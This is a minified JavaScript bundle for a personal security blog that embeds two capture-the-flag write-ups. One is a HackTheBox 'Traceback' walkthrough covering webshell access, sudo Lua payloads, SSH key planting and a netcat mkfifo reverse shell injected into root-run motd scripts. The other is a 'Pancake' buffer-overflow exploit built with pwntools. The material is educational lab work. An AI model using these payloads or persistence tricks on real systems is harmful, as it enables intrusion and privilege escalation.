(this.webpackJsonpblog=this.webpackJsonpblog||[]).push([[0],{201:function(e,t){},221:function(e,t,n){"use strict";n.r(t);var a=n(0),o=n.n(a),s=n(68),i=n.n(s),r=(n(75),n(76),n(77),n(19)),c=n(20),l=n(22),d=n(21),m=(n(78),function(e){Object(l.a)(n,e);var t=Object(d.a)(n);function n(){return Object(r.a)(this,n),t.apply(this,arguments)}return Object(c.a)(n,[{key:"render",value:function(){var e;return"large"===this.props.size?e="Header-Large":"medium"===this.props.size?e="Header-Medium":"small"===this.props.size&&(e="Header-Small"),o.a.createElement("p",{className:e},this.props.text)}}]),n}(o.a.Component)),u=function(e){Object(l.a)(n,e);var t=Object(d.a)(n);function n(){return Object(r.a)(this,n),t.apply(this,arguments)}return Object(c.a)(n,[{key:"renderTable",value:function(){return this.props.list.map((function(e){var t=e.title,n=e.text;return o.a.createElement("div",null,o.a.createElement(h,{title:t,text:n}),o.a.createElement("br",null))}))}},{key:"render",value:function(){return o.a.createElement("div",null,this.renderTable())}}]),n}(o.a.Component),h=function(e){Object(l.a)(n,e);var t=Object(d.a)(n);function n(){return Object(r.a)(this,n),t.apply(this,arguments)}return Object(c.a)(n,[{key:"render",value:function(){return o.a.createElement("div",{className:"Card"},o.a.createElement("p",null,this.props.title),o.a.createElement("p",{className:"Text"},this.props.text)," ",o.a.createElement("br",null))}}]),n}(o.a.Component),p=n(15),f=n(1),b=n(39),g=n.n(b),y=[{title:"OSCP Prep (2020 - Present)",text:"Currently studying for the OSCP exam, sponsored by the UMass Pentest Club."},{title:"Security Researcher (2019 - Present)",text:"Ethical hacker making the internet a safer place."},{title:"UMass Pentest Club (2018 - Present)",text:"All the cool computer stuff happens here."},{title:"ConceptX (2018-2019)",text:"Helped create a platform providing quality education to students across Burma."}];function A(){return o.a.createElement("div",{className:"App"},o.a.createElement("div",{className:"Main"},o.a.createElement(m,{text:"Aung Khant",size:"large"}),o.a.createElement(m,{text:"Coder/Hacker",size:"medium"}),o.a.createElement("br",null),o.a.createElement("a",{href:"#aboutme",className:"Link"},"about me"),o.a.createElement("a",{href:"#whatido",className:"Link"},"what i do"),o.a.createElement("a",{href:"https://github.com/notakay/notakay.github.io/raw/master/assets/resume.pdf",target:"_blank",rel:"noopener noreferrer",className:"Link"},"resume"),o.a.createElement(p.b,{to:"/blog",className:"Link"},"blog")),o.a.createElement("div",{className:"Section",id:"aboutme"},o.a.createElement(m,{text:"About me",size:"small"}),o.a.createElement("br",null),o.a.createElement("p",null,"Hi! I'm Akay. I'm a computer science student at UMass Amherst."),o.a.createElement("br",null),o.a.createElement("p",null,"I do a lot fun things with computers, from web development to reverse engineering."),o.a.createElement("br",null),o.a.createElement("p",null,"I'm a very fast learner with strong interests in operating systems and cybersecurity."),o.a.createElement("br",null),o.a.createElement("p",null,"When I'm not grinding psets, I'm probably hacking things or playing dota2."),o.a.createElement("br",null)),o.a.createElement("div",{className:"Section Last",id:"whatido"},o.a.createElement(m,{text:"What I do",size:"small"}),o.a.createElement("br",null),o.a.createElement(u,{list:y})))}function x(){return o.a.createElement("div",{className:"App"},o.a.createElement("div",{className:"Blog"},o.a.createElement("div",{className:"markdown-body"},o.a.createElement(g.a,{source:"\n# Traceback (HackTheBox)\n###### August 19, 2020\nStarted the box by enumerating services on the machine using nmap. Nmap scan returned http and ssh services which weren't that interesting.\n\n```\n# Nmap 7.80 scan initiated Wed May 20 06:40:09 2020 as: nmap -sV -sT -oN nmap 10.10.10.181\nNmap scan report for 10.10.10.181\nHost is up (0.094s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Wed May 20 06:40:21 2020 -- 1 IP address (1 host up) scanned in 11.59 seconds\n```\n\nGoing to http://10.10.10.181, the website had already been owned by Xh4H and the hacker claims to have left a backdoor somewhere.\n\nRunning directory bruteforcing using Daniel Miessler's wordlists returned zero results. However, upon checking the page source, there's a comment saying \"Some of the best web shells that you might need\". \nThrowing that string into Google took me to a Github repo https://github.com/TheBinitGhimire/Web-Shells.\n\nGoing through the list of backdoors, http://10.10.10.181/smevk.php returned a <code>HTTP 200 OK</code>. Using the default credentials <code>admin:admin</code>, I was able to gain access to the webshell.\nThe webshell's interface was really ugly, but it was sufficient to do some basic enumeration.\n```\n# Determine user\n$ whoami\nwebadmin\n\n# Check home directory\n$ ls -a /home/webadmin\n. .. .bash_history .bash_logout .bashrc .cache .local .luvit_history .profile .ssh note.txt\n\n# Read note.txt\n$ cat /home/webadmin/note.txt\n- sysadmin -\nI have left a tool to practice Lua.\nI'm sure you know where to find it.\nContact me if you have any question.\n\n# List user privileges\n$ sudo -l\nMatching Defaults entries for webadmin on traceback:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\n\nUser webadmin may run the following commands on traceback:\n    (sysadmin) NOPASSWD: /home/sysadmin/luvit\n```\nLooking through the results, it seems <code>/home/sysadmin/luvit</code> can be executed as the user <code>sysadmin</code> without authentication.\n\nI had never written a single line of Lua code before and after doing some googling it seems that Luvit is a runtime environment for Lua.\nReading through the documentation I tried to craft some lua payload which will be executed as <code>sysadmin</code>.\n\nThe following lua code lists files in <code>/home/sysadmin</code>\n\n```\ndirectory='/home/sysadmin/'\npfile = io.popen('ls -a \"'..directory..'\"')\nfor filename in pfile:lines() do\n    print(filename)\nend\n```\n\nTo execute this piece of code, I simply had to write this code somewhere on the box and run it using luvit. To do so, I echoed my code to <code>/tmp/</code> on the box and ran it.\n\n```\n$ echo \"directory='/home/sysadmin/';pfile = io.popen('ls -a \"'..directory..'\"');for filename in pfile:lines() do;print(filename);end\" > /tmp/listdir.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/listdir.lua\n. .. .bash_history .bash_logout .bashrc .cache .local .profile .ssh luvit user.txt\n\n```\n\nModifying the payload to print <code>/home/sysadmin/user.txt</code>, I got my first flag.\n\n```\n$ echo \"pfile = io.popen('cat /home/sysadmin/user.txt');for filename in pfile:lines() do;print(filename);end\" > /tmp/getflag.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/getflag.lua\n{{FLAG}}\n\n```\n\nEnumerating through sysadmin's home folder, I found the <code>.ssh</code> folder with the <code>authorized_keys</code> file. Adding my public key to this file should grant me ssh access as sysadmin to the box.\nUsing <code>ssh-keygen</code>, I created a new ssh keypair. The payload adds my public key to the list of authorized keys. \n\n```\n$ echo \"io.popen(\\\"echo '{{PUBLIC KEY}}' >> /home/sysadmin/.ssh/authorized_keys\\\")\" > /tmp/ssh.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/ssh.lua\n```\n\nSsh-ed into the box using <code>ssh -i PRIVATE_KEY sysadmin@10.10.10.181</code> and I was greeted by a message from Xh4h and a shell.\n```\n\u279c  ~ ssh -i PRIVATE_KEY sysadmin@10.10.10.181\n#################################\n-------- OWNED BY XH4H  ---------\n- I guess stuff could have been configured better ^^ -\n#################################\n\nWelcome to Xh4H land \n\n$\n```\n\nTrying to privilege escalate from sysadmin to root was kinda tricky. I tried looking for files with incorrect permisions or suid binaries but found nothing. However looking through the list of processes using <code>ps -aux</code>, there was a command being executed as root that seemed to be running at intervals.\n\n```\nroot       3851  0.0  0.0   4628   772 ?        Ss   19:15   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\n```\n\nThe command seems to be restoring a backup of the message of the day (motd), which is a service that can be used to print custom greeting messages upon login - similar to the greeting from Xh4h upon ssh-ing into the box.\n\nLooking through <code>/etc/update-motd.d/</code>, there were several messages and the first one <code>/etc/update-motd.d/00-header</code> contained <code>echo \"\nWelcome to Xh4H land \n\"</code>, which was the greeting upon logging into the box. This could be abused by adding commands to run upon login, which will be run as root.\n\nI set up a reverse shell listener on port 1337 on my local machine. Afterwards, I edited <code>/etc/update-motd.d/00-header</code> to set up a netcat reverse shell connector. \n\n```\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ipaddr}} 1337 >/tmp/f; echo \"\nWelcome to Xh4Hland \n\"\n```\n\nIn a different window, ssh into the box and monitor the reverse shell listener. Note that it may require a few tries since the motd gets overwritten every 30 seconds. If timed correctly you should have access to the root shell. Navigate to <code>/root</code> to grab the root flag.\n\n```\n$ cat /root/root.txt\n{{FLAG}}\n\n```\n\n",escapeHtml:!1}))))}function _(){return o.a.createElement("div",{className:"App"},o.a.createElement("div",{className:"Blog"},o.a.createElement("div",{className:"markdown-body"},o.a.createElement(g.a,{source:"\n# Pancake (HacktivityCon CTF)\n###### August 1, 2020\n**Description**\n\nPancake is a simple binary exploitation challenge from HacktivityCon CTF.\nEntering a long string causes a buffer overflow and pancake segfaults. Some familiarity with radare2 and the call stack will be helpful going through this writeup. A great guide on radare2 can be found [here](https://www.megabeets.net/a-journey-into-radare-2-part-1/).\n\n**Analysis**\n\nLoad and analyze the binary in radare2. The stack is not executable, but the file isn't protected by [canaries](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries) nor compiled with support for [position independent code](https://en.wikipedia.org/wiki/Position-independent_code). This means that there is no protection against buffer overflows and the segments will always be loaded to the same location.\n\n```\n$ r2 -A pancakes\n[0x00400700]> iI\narch     x86\nbaddr    0x400000\nbinsz    6995\nbintype  elf\nbits     64\ncanary   false\nnx       true\npic      false\n... (output truncated)\n```\n\n\nList function symbols within the binary. Although most of the functions are from C libraries and calls used by the program, two of them stand out. One of them is <code>main</code>, which is always worth checking out. The second is <code>secret_recipe</code>, which seems to be a user defined function.\n\n```\n[0x00400700]> afl\n0x00400700    1 42           entry0\n0x00400740    4 42   -> 37   sym.deregister_tm_clones\n0x00400770    4 58   -> 55   sym.register_tm_clones\n0x004007b0    3 34   -> 29   sym.__do_global_dtors_aux\n0x004007e0    1 7            entry.init0\n0x00400a70    1 2            sym.__libc_csu_fini\n0x00400a74    1 9            sym._fini\n0x0040098b    1 113          sym.secret_recipe\n0x004006d0    1 6            sym.imp.fopen\n0x00400690    1 6            sym.imp.fread\n0x00400680    1 6            sym.imp.puts\n0x00400a00    4 101          sym.__libc_csu_init\n0x00400730    1 2            sym._dl_relocate_static_pie\n0x004007e7   10 420          main\n0x00400648    3 23           sym._init\n0x00400670    1 6            sym.imp.putchar\n0x004006a0    1 6            sym.imp.printf\n0x004006b0    1 6            sym.imp.gets\n0x004006c0    1 6            sym.imp.setvbuf\n0x004006e0    1 6            sym.imp.atoi\n0x004006f0    1 6            sym.imp.usleep\n0x004000ea    1 2            fcn.004000ea\n```\n\nFirstly, examine the <code>secret_recipe</code> because it's supposed to be a secret. Going over the disassembly, the function is simple. <code>secret_recipe</code> opens a file named <code>flag.txt</code>, reads it contents and prints it out.\n\n```\n[0x00400700]> pdf @ sym.secret_recipe\n... (output truncated, radare comments removed for better readability)\n0x004009a5       488d3dce0200.   lea rdi, str.flag.txt\n0x004009ac       e81ffdffff      call sym.imp.fopen\n0x004009b1       488945f0        mov qword [stream], rax\n0x004009b5       488b55f0        mov rdx, qword [stream]\n0x004009b9       488d8560ffff.   lea rax, [ptr]\n0x004009c0       4889d1          mov rcx, rdx\n0x004009c3       ba80000000      mov edx, 0x80\n0x004009c8       be01000000      mov esi, 1\n0x004009cd       4889c7          mov rdi, rax\n0x004009d0       e8bbfcffff      call sym.imp.fread\n0x004009f4       e887fcffff      call sym.imp.puts\n```\n\nNext, skimming through the disassembly for <code>main</code>, the function also seems fairly straightforward - prints some stuff, gets user input and prints more stuff. <code>main</code> uses the <code>gets</code> function to get input. <code>gets</code> is a deprecated function that does not peform checks on input length, leading to potential buffer overflows exploits. This explains the segfault upon passing in a long string.\n\n```\n[0x00400700]> pdf @ main\n... (output truncated, radare comments removed for better readability)\n0x0040085b      e860feffff     call sym.imp.setvbuf\n0x00400860      488d3d510300.  lea rdi, str.Welcome_to_the_pancake_stacker\n0x00400867      e814feffff     call sym.imp.puts\n0x0040086c      488d3d650300.  lea rdi, str.How_many_pancakes_do_you_want\n0x00400873      e808feffff     call sym.imp.puts\n0x00400878      488d8570ffff.  lea rax, [str]\n0x0040087f      4889c7         mov rdi, rax\n0x00400882      b800000000     mov eax, 0\n0x00400887      e824feffff     call sym.imp.gets\n0x0040088c      488d8570ffff.  lea rax, [str]\n0x00400893      4889c7         mov rdi, rax\n0x00400896      b800000000     mov eax, 0\n0x0040089b      e840feffff     call sym.imp.atoi\n0x004008a0      8945f0         mov dword [var_10h], eax\n0x004008a3      488d3d4d0300.  lea rdi, str.Cooking_your_cakes\n0x004008aa      b800000000     mov eax, 0\n0x004008af      e8ecfdffff     call sym.imp.printf\n... (output truncated)\n```\n\n\nNote that <code>main</code> does not make a call to <code>secret_recipe</code>. Maybe the vulnerable <code>gets</code> can be exploited to overwrite the return address on the stack?\n\n**Exploitation**\n\nTo craft the payload, we need to identify the offset in our buffer where the return address will be placed. To do so, generate a [De Bruijn Sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) long enough string to cause a segfault. The sequence can be generated by using <code>ragg2</code>, which is part of the radare project.\n\n```\n$ ragg2 -P 200 -r\nAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA%\n```\n\nRun radare2 in debug mode <code>r2 -d ./pancake</code>. Analyze the binary and set a breakpoint at the <code>ret</code> instruction in <code>main</code>. This will pause execution of the program just before the <code>main</code> function exits, allowing us to examine the stack. <code>dc</code> to begin execution of the program, passing the De Bruijn Sequence when prompted. Since we have placed a breakpoint at the end of main, the program should pause execution. Print the first 16 bytes on the stack using <code>pxw 8 @ rsp</code>. Using the first four bytes on the stack, calculate the offset using the command <code>wopO 0x41417a41</code>. This is where we will place the address to <code>secret_recipe</code>.\n\n```\n[0x00400700]> pdf @ main\n... (output truncated)\n0x00400984      b800000000     mov eax, 0\n0x00400989      c9             leave\n0x0040098a      c3             ret\n[0x00400700]> db 0x0040098a\n[0x00400700]> dc\n... (output truncated)\nhit breakpoint at: 40098a\n[0x0040098a]> pxw 16 @ rsp\n0x7ffffe1723b8  0x41417a41 0x32414131 0x41334141 0x41413441  AzAA1AA2AA3AA4AA\n[0x0040098a]> wopO 0x41417a41\n152\n```\n\nThe final payload will be just a buffer of 152 bytes with the address of <code>secret_recipe</code> added onto the end. Since data is stored and loaded in little endian format on x86, the address to <code>secret_recipe</code> must be passed with the same endianess. Pwntools can be used to easily convert the address into little endian format, instead of doing it manually, which can be tedious. Finally create a file (if it does not already exist) in the same directory named <code>file.txt</code> to test the payload.\n\n```\n$ cat flag.txt \nFLAG{HASH123}\n$ python -c \"from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)\" | ./pancakes\n...(output truncated)\nFLAG{HASH123}\n\n[1]    17531 done                              python -c  | \n       17532 segmentation fault (core dumped)  ./pancakes\n```\n\nWith the payload working, throw it over netcat to capture the flag.\n\n```\n$ {python -c \"from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)\";cat;} | nc jh2i.com 50021\nWelcome to the pancake stacker!\nHow many pancakes do you want?\nCooking your cakes.....\nSmothering them in butter.....\nDrowning them in syrup.....\nThey're ready! Our waiters are bringing them out now...\n        _____________\n       /    ___      \\\n      ||    \\__\\     ||\n      ||      _      ||\n      |\\     /      /|\n      \\ \\___/ ^ \\___/ /\n      \\\\____/_^_\\____//_\n    __\\\\____/_^_\\____// \\\n   /   ____/_^_____/ \\ \\\n  //                   , /\n  \\\\___________   ____  /\n               \\_______/\n\nflag{too_many_pancakes_on_the_stack}\n```\n",escapeHtml:!1}))))}function w(){return o.a.createElement("div",{className:"App"},o.a.createElement("div",{className:"Main"},o.a.createElement(m,{text:"Blog",size:"large"}),o.a.createElement("br",null),o.a.createElement(p.b,{to:"/blog/pancake",className:"Link"},"pancake (HacktivityCon)"),o.a.createElement("br",null)," ",o.a.createElement("br",null)," ",o.a.createElement("br",null),o.a.createElement(p.b,{to:"/blog/traceback",className:"Link"},"Traceback (HackTheBox)")))}var v=function(){return o.a.createElement("div",null,o.a.createElement(p.a,null,o.a.createElement(f.c,null,o.a.createElement(f.a,{path:"/blog/pancake"},o.a.createElement(_,null)),o.a.createElement(f.a,{path:"/blog/traceback"},o.a.createElement(x,null)),o.a.createElement(f.a,{path:"/blog"},o.a.createElement(w,null)),o.a.createElement(f.a,{path:"/"},o.a.createElement(A,null)))))};Boolean("localhost"===window.location.hostname||"[::1]"===window.location.hostname||window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));i.a.render(o.a.createElement(o.a.StrictMode,null,o.a.createElement(v,null)),document.getElementById("root")),"serviceWorker"in navigator&&navigator.serviceWorker.ready.then((function(e){e.unregister()})).catch((function(e){console.error(e.message)}))},70:function(e,t,n){e.exports=n(221)},75:function(e,t,n){},76:function(e,t,n){},77:function(e,t,n){},78:function(e,t,n){}},[[70,1,2]]]);
//# sourceMappingURL=main.d18dbbc7.chunk.js.map